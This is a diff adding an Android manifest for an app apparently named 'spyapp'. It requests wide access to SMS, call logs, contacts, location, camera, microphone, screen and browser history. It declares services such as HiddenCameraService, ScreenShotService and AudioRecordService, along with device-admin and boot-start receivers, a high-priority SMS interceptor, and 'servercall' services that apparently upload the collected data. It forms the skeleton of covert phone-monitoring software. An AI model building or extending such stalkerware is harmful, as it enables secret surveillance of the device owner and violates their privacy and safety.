@@ -1,0 +1,268 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.app.spyapp">
+    <!-- [START gcm_permission] -->
+
+
+
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"></uses-permission>
+    <uses-permission android:name="android.permission.READ_CONTACTS"></uses-permission>
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO"></uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+
+    <uses-permission android:name="android.permission.SEND_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"></uses-permission>
+
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <uses-permission android:name="com.app.spyapp.permission.INTERACT_ACROSS_USERS_FULL"
+        android:protectionLevel="signature"/>
+
+    <uses-feature android:name="android.hardware.camera" />
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+
+    <uses-permission
+        android:name="android.permission.READ_FRAME_BUFFER"
+        tools:ignore="ProtectedPermissions" />
+
+    <permission
+        android:name="com.app.spyapp.permission.C2D_MESSAGE"
+        android:protectionLevel="signature" />
+    <uses-permission android:name="com.app.spyapp.permission.C2D_MESSAGE" />
+
+    <!-- This app has permission to register and receive data message. -->
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+
+
+    <application
+        android:name=".SpyApp"
+        android:allowBackup="true"
+        android:largeHeap="true"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme">
+        <activity
+            android:name=".HomeActivity"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <provider
+            android:name=".provider.RecordingProvider"
+            android:authorities="com.app.spyapp" />
+
+        <receiver
+            android:name=".receiver.CallBroadcastReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".receiver.DeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+
+                <!-- This action is required -->
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+
+            <!-- This is required this receiver to become device admin component. -->
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_sample" />
+        </receiver>
+
+        <!-- [START gcm_receiver] -->
+        <receiver
+            android:name="com.google.android.gms.gcm.GcmReceiver"
+            android:exported="true"
+            android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
+                <category android:name="com.app.spyapp" />
+            </intent-filter>
+        </receiver>
+        <!-- [END gcm_receiver] -->
+
+        <!-- [START gcm_listener] -->
+        <service
+            android:name=".gcm.MyGcmListenerService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
+            </intent-filter>
+        </service>
+        <!-- [END gcm_listener] -->
+        <!-- [START instanceId_listener] -->
+        <service
+            android:name=".gcm.MyInstanceIDListenerService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.android.gms.iid.InstanceID" />
+            </intent-filter>
+        </service>
+        <!-- [END instanceId_listener] -->
+        <service
+            android:name=".gcm.RegistrationIntentService"
+            android:exported="false"></service>
+        <service
+            android:name=".service.ContactService"
+            android:exported="false"></service>
+        <service
+            android:name=".service.ScreenShotService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.BatteryLevelService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.HiddenCameraService"
+            android:exported="false"></service>
+
+        <!--<service-->
+            <!--android:name=".service.HistoryService"-->
+            <!--android:exported="false"></service>-->
+
+        <service
+            android:name=".service.BookmarkService"
+            android:exported="false"></service>
+        <service
+            android:name=".service.CallLogService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.CallLogService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.MMSService"
+            android:exported="false"></service>
+        <service
+            android:name=".service.AudioRecordService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.ImageListService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.VideoListService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.GetLocationService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.GetgeneralInfoService"
+            android:exported="false"></service>
+
+        <service
+            android:name=".service.WifiInfoService"
+            android:exported="false"></service>
+        <service
+            android:name=".receiver.SendSMSInfoService"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="com.app.spyapp.receiver.ListenSmsMmsService"></action>
+            </intent-filter>
+        </service>
+        <service android:name=".service.RecordService"></service>
+        <service android:name=".service.TService"></service>
+        <service android:name=".service.SaveFileServices"></service>
+        <service android:name=".service.InstallAppListService"></service>
+        <service android:name=".service.CalenderEventService"></service>
+
+        <receiver
+            android:name=".receiver.SMSReceiver"
+            android:enabled="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".receiver.MMSReceiver">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+        <!-- Start the Service if applicable on boot -->
+        <receiver android:name=".receiver.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receiver.EventChangeReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PROVIDER_CHANGED" />
+
+                <data android:scheme="content" />
+                <data android:host="com.android.calendar" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receiver.ApplicationAddReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_INSTALL" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name=".service.SmsService"></service>
+        <service
+            android:name=".service.ContactAddService"
+            android:enabled="true"></service>
+        <service
+            android:name=".service.CallLogChangeService"
+            android:enabled="true"></service>
+        <!--<service-->
+            <!--android:name=".service.BookmarkHistoryChangeService"-->
+            <!--android:enabled="true"></service>-->
+
+
+        <!--GCM call for final list-->
+        <service android:name=".servercall.SMSCallService"></service>
+        <service android:name=".servercall.MMSCallService"></service>
+        <service android:name=".servercall.ContactCallService"></service>
+        <service android:name=".servercall.CallLogCallService"></service>
+        <service android:name=".servercall.EventListCallService"></service>
+        <service android:name=".servercall.BookMarkCallService"></service>
+        <service android:name=".servercall.HistoryCallService"></service>
+        <service android:name=".servercall.InstallAppCallService"></service>
+        <service android:name=".servercall.AudioRecordCallService"></service>
+    </application>
+
+</manifest>
